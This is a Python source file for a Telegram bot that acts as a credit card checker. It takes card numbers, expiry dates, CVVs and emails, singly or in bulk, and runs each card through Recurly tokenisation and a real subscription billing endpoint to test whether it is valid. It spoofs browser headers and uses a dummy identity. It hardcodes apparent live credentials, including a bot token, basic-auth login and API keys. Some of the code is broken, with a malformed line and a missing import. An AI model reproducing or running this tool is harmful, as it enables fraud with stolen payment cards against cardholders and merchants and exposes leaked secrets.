import telebot
import requests
import json
import logging

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Replace with your actual Telegram Bot Token
BOT_TOKEN = "8072279299:AAHAEodRhWpDb2g7EIVNFc3pk1Yg0YlpaPc"
bot = telebot.TeleBot(BOT_TOKEN)

# API Details
KCM_BASE_URL = "https://services.keepingcurrentmatters.com/api/kcmft/v1"
RECURLY_BASE_URL = "https://api.recurly.com/js/v1"
KCM_AUTH = ("kcmftform", "LTMtvb6mByjLdq")
RECURLY_PUBLIC_KEY = "ewr1-xjjpPJHol9bMZujW5RI1Z2"
INDUSTRY_ID = 1
PLAN_CODE = "expert-monthly"  # You can make this a variable if needed
COUPON_CODE = ""
PHONE_NUMBER = "3144740104"  # You can make this a variable
ALLOW_TEXT = False
JRR_TOKEN = "0.O1eCf47WeJbW2l2zZzeJbLWUtJEhrYUT6JUma6giJevG8QQ2EQMoSC_u5IoAvntBUX6UaypQ2DbtzG1dFv73FJFv3v5_ONFc1xUq1oFcR0wbLtp49L4Z9gJmfrKk9FII_eQtoO7ghxbM3UUwwUJhiOFOAQtF-_kLLeaw3r3v8UGv11HnLexQ_UXOsOOjzArbAfJB5apqekagNBpbX3wYg6MLe_TPqY-oOphhyOd88fKvDwFMPsW0Kchs7ADD-xHoU4CnJAoMH-S_YLLtwJFgNCktMYaExrhO9TjIV2ld6fH4MeDHzZMYdfYO82a9r7FEeog4dTVkebGznqwPGJdH30EpewVXKpsaKMq4KCCy4tjiw27-S8uwOoKCB6kG-N66VbiamyznUTk0LCln1Zugbu7JOHGDSN0KA-B_ha0nOFC2MhldQwfvtKo4Nc9HPFqZRQVBWl2WpkMuTMAFvwFWtFfZx0yxQTMFhTySCNA0Le4fEvRHxxZ5CVI88x1aIvhA-sbi_FCUhSsujudh2Ls5FTv2X-Nj7yu2GZ9-XKy0FvqJ78n2V12hUPImgg2unnFPxzFZ9XlU9yGFWH2hRvYWxKFKd4BX2k6a5a0oCzPciPKtCsuJIkYSJrSoAi6mfjK7mGv47WdlM5hfnE3LdHSICa0GojZtw2EtlyBPoxIFeEHOBgiBF09uHuAPRy3Ikv355u8-TVgPDoyqEbghCC1cyAWQmKUXwnOQ9-MJI9At_VO8k1k853vKfD9rQKbGloIz_FhRxCqao19d4D8JrtxYRytvJ9WwRepjIbIu9DOMwhpA_d7CNMvs59Rx8U5YOcXlKFSJ4a_-dCJtcjRKwsr1mrKY_StoqPC7wzcLgMHzTrPDuWiNngEPYihTHIZ7ojjKiVWg-Ewd4gUEABx9SGnXUqj_42gW_wm-greUbzibsQo.qTFgcNJGyVEEIV68snzz1A.8691646e375906e33bbe0388ad86817782a066d8c67583033be2875d1db58e06" # From your example
UTM_CONTENT = None
UTM_CAMPAIGN = None
UTM_MEDIUM = None
UTM_SOURCE = None
UTM_TERM = None
TRIAL_FUNNEL = ""
DEVICE_ID = "LBGia12ruwmEXOGB" # From your example
SESSION_ID = "pAggs6FP4WWXJAch" # From your example
INSTANCE_ID = "TmWY0EjsVGH6o2iQ" # From your example

# Headers
KCM_HEADERS = {
    "Content-Type": "application/json",
    "Accept": "application/json, text/plain, */*",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.37 Mobile/15E148 Safari/604.1",
    "Origin": "https://www.keepingcurrentmatters.com",
    "Referer": "https://www.keepingcurrentmatters.com/",
    "Sec-Fetch-Site": "same-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
}

RECURLY_HEADERS = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "*/*",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.37 Mobile/15E148 Safari/604.1",
    "Origin": "https://api.recurly.com",
    "Referer": "https://api.recurly.com/",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
}

def check_user_exists(email):
    url = f"{KCM_BASE_URL}/check-user"
    payload = json.dumps({"email": email})
    headers = KCM_HEADERS.copy()
    try:
        response = requests.post(url, headers=headers, data=payload, auth=KCM_AUTH)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        logging.error(f"Error checking user: {e}")
        return {"error": str(e)}
    except json.JSONDecodeError:
        logging.error(f"Error decoding check user response: {response.text}")
        return {"error": f"Failed to decode response: {response.text}"}

def get_recurly_token(cc, month, year, cvv, first_name="John", last_name="Doe", address1="198 White Horse Pike", city="West Collingswood", state="NJ", postal_code="08107", country="US"):
    url = f"{RECURLY_BASE_URL}/token"
    payload = f"first_name={first_name}&last_name={last_name}&address1={address1}&city={city}&state={state}&postal_code={postal_code}&country={country}&token=&number={cc}&browser[color_depth]=24&browser[java_enabled]=false&browser[language]=en-US&browser[referrer_url]=https%3A%2F%2Fwww.keepingcurrentmatters.com%2Ftrial%2F&browser[screen_height]=932&browser[screen_width]=430&browser[time_zone_offset]=-180&browser[user_agent]=Mozilla%2F5.0%20%28iPhone%3B%20CPU%20iPhone%20OS%2018_2%20like%20Mac%20OS%20X%29%20AppleWebKit%2F605.1.15%20%28KHTML%2C%20like%20Gecko%29%20CriOS%2F130.0.6723.37%20Mobile%2F15E148%20Safari%2F604.1&month={month}&year={year}&cvv={cvv}&version=4.33.2&key={RECURLY_PUBLIC_KEY}&deviceId={DEVICE_ID}&sessionId={SESSION_ID}&instanceId={INSTANCE_ID}"
    headers = RECURLY_HEADERS.copy()
    headers["Content-Length"] = str(len(payload))
    try:
        response = requests.post(url, headers=headers, data=payload)
        response.raise_for_status()
        return response.json().get("token")
    except requests.exceptions.RequestException as e:
        logging.error(f"Error getting Recurly token: {e}")
        return None
    except json.JSONDecodeError:
        logging.error(f"Error decoding Recurly token response: {response.text}")
        return None

def setup_billing(email, payment_token):
    url = f"{KCM_BASE_URL}/industries/{INDUSTRY_ID}/setup-billing"
    payload = json.dumps({
        "first_name": "John",
        "last_name": "Doe",
        "email": email,
        "payment_token": payment_token,
        "plan_code": PLAN_CODE,
        "coupon_code": COUPON_CODE,
        "phone": PHONE_NUMBER,
        "allow_text": ALLOW_TEXT,
        "jrr": JRR_TOKEN,
        "utm_content": UTM_CONTENT,
        "utm_campaign": UTM_CAMPAIGN,
        "utm_medium": UTM_MEDIUM,
        "utm_source": UTM_SOURCE,
        "utm_term": UTM_TERM,
        "trial_funnel": TRIAL_FUNNEL
    })
    headers = KCM_HEADERS.copy()
    headers["Content-Length"] = str(len(payload))
    try:
        response = requests.post(url, headers=headers, data=payload, auth=KCM_AUTH)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        logging.error(f"Error setting up billing: {e}")
        return {"error": str(e)}
    except json.JSONDecodeError:
        logging.error(f"Error decoding setup billing response: {response.text}")
        return {"error": f"Failed to decode response: {response.text}"}

# Telegram Bot Handlers
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome! Send me credit card details in the format: cc|mm|yy|cvv|email (single card) or one card per line for multiple checks.")

@bot.message_handler(func=lambda message: len(message.text.split('|')) == 5)
def process_single_card(message):
    try:
        cc, mm_str, yy_str, cvv, email = message.text.split('|')

        if not (mm_str.isdigit() and yy_str.isdigit() and cvv.isdigit()):
            bot.reply_to(message, "Invalid month, year, or CVV. Please use numbers.")
            return

        mm = int(mm_str)
        yy_padded = yy_str if len(yy_str) == 4 else f"20{yy_str}"

        bot.reply_to(message, f"Checking user {email}...")
        user_check_result = check_user_exists(email)
        bot.reply_to(message, f"User Check Result: {user_check_result}")

        bot.reply_to(message, "Getting Recurly token...")
        recurly_token = get_recurly_token(cc, str(mm).zfill(2), yy_padded, cvv)

        if recurly_token:
            bot.reply_to(message, f"Recurly Token obtained: {recurly_token}. Setting up billing...")
            billing_result = setup_billing(email, recurly_token)
            bot.reply_to(message, f"Billing Setup Result: {billing_result}")
        else:
            bot.reply_to(message, "Failed to obtain Recurly token. Card might be invalid.")

    except ValueError:
        bot.reply_to(message, "Invalid input format. Please use: cc|mm|yy|cvv|email")
    except Exception as e:
        logging.error(f"Error processing single card input: {e}")
        bot.reply_to(message, f"An error occurred: {e}")

@bot.message_handler(func=lambda message: '|' in message.text and '\n' in message.text)
def process_multiple_cards(message):
    cards = message.text.strip().split('\n')
    results = []
    bot.reply_to(message, f"Processing {len(cards)} cards...")
    for card_info in cards:
        try:
            parts = card_info.split('|')
            if len(parts) != 5:
                results.append(f"Invalid format: {card_info}. Please use cc|mm|yy|cvv|email")
                continue
            cc, mm_str, yy_str, cvv, email = parts

            if not (mm_str.isdigit() and yy_str.isdigit() and cvv.isdigit()):
                results.append(f"Card ending in {cc[-4:]}: Invalid date or CVV format.")
                continue

            mm = int(mm_str)
            yy_padded = yy_str if len(yy_str) == 4 else f"20{yy_str}"

            results.append(f"Checking user {email}...")
            user_check_result = check_user_exists(email)
            results.append(f"User Check Result for {email}: {user_check_result}")

            results.append(f"Getting Recurly token for card ending in {cc[-4:]}...")
            recurly_token = get_recurly_token(cc, str(mm).zfill(2), yy_padded, cvv)

            if recurly_token:
                results.append(f"Recurly Token obtained for card ending in {cc[-4:]}: {recurly_token}. Setting up billing...")
                billing_result = setup_billing(email, recurly_token)
                results.append(f"Billing Setup Result for {email}: {billing_result}")
            else:
                results.append(f"Failed to obtain results.append(f"Recurly token for card ending in {cc[-4:]} failed. Card might be invalid.")
            time.sleep(5) # Be mindful of rate limiting

        except Exception as e:
            logging.error(f"Error processing a card: {e}")
            results.append(f"Error processing a card: {e}")

    bot.reply_to(message, "\n".join(results))

@bot.message_handler(func=lambda message: True)
def echo_all(message):
    bot.reply_to(message, "Send me credit card details in the format: cc|mm|yy|cvv|email (single card) or one card per line for multiple checks.")

if __name__ == '__main__':
    logging.info("Bot started...")
    bot.polling(none_stop=True)
